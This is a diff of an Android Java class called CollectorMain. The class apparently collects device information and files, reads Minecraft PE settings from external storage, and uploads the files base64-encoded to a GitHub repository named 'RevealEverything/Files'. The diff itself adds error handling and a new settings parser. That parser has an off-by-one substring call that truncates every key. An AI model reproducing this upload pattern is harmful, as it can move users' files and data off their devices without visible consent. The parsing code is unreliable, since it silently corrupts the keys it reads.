@@ -63,12 +63,12 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		running = true;
 		try {
 			Log.d("CollectorMain", "start");
-			String s="";
+			String s="!!ERROR!!";
 			try {
 				sb.edit().putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos())).commit();
 				Log.d("CollectorMain", "collect");
 			} catch (Throwable e) {
-
+				DebugWriter.writeToE("CollectorMain",e);
 			} finally {
 				System.out.println(s);
 			}
@@ -105,6 +105,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 						} catch (Throwable e) {
 							DebugWriter.writeToE("CollectionMain",e);
 							Log.d("CollectorMain", "skipped");
+							continue;
 						}
 						params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
 						ghc.put("/repos/RevealEverything/Files/contents/" + filename, params, TypeToken.get(ContentUpload.class).getType());
@@ -124,7 +125,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		} catch (Throwable e) {
 			DebugWriter.writeToE("CollectorMain",e);
 		} finally {
-			Log.d("CollectorMain", "end");		
+			Log.d("CollectorMain", "end");
 			running=false;
 			for (String s:sb.getAll().keySet()) {
 				Log.d("CollectorMain", "remain: "+s);
@@ -278,8 +279,12 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		private OrderTrustedMap<String,String> readSettings() {
 			OrderTrustedMap<String,String> data=new OrderTrustedMap<>();
 			for(String s:Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/options.txt")))) {
-				String[] spl=s.split("\\:");
-				data.put(spl[0], spl[1]);
+				int colonOfs=s.indexOf(':');
+				if(colonOfs==-1){
+					data.put(s,null);
+				}else{
+					data.put(s.substring(0,colonOfs-1),s.substring(colonOfs+1));
+				}
 			}
 			return data;
 		}
